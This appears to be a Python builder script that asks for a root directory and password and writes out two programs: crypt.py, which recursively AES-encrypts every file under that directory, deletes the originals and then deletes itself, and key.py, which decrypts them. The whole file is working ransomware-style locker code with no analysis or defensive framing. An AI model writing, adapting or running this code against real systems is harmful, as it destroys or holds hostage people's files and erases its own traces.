import colorama
from colorama import init
from colorama import Fore, Back, Style
direct=input("\033[34mWrite the root directory:\033[39m ")
password=input("\033[34mWrite the password:\033[39m ")
print("---------------------------------------------------------------" )
with open("crypt.py","w") as crypt: 
	crypt.write('''
import os, sys
def crypt(file):
	import pyAesCrypt
	print("---------------------------------------------------------------" )
	password="'''+str(password)+'''"
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
	print("[crypted] '"+str(file)+".crp'")
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir): 
		path = os.path.join(dir, name)
		if os.path.isfile(path): crypt(path)
		else: walk(path)
walk("'''+str(direct)+'''")
print("---------------------------------------------------------------" )
os.remove(str(sys.argv[0]))''')
	print("\033[42m[>]\033[39mFile 'crypt.py' successfully saved!")
with open("key.py","w") as key: 
	key.write('''
import os, sys
def decrypt(file):
	import pyAesCrypt
	print("---------------------------------------------------------------" )
	password="'''+str(password)+'''"
	bufferSize = 512*1024
	pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize)
	print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
	os.remove(file)
def walk(dir):
	for name in os.listdir(dir):
		path = os.path.join(dir, name)
		if os.path.isfile(path):
			try: decrypt(path)
			except: pass
		else: walk(path)
walk("'''+str(direct)+'''")
print("---------------------------------------------------------------" )
os.remove(str(sys.argv[0]))''')
	print("\33[42m[>]\033[39mFile 'key.py' successfully saved!")
print("---------------------------------------------------------------" )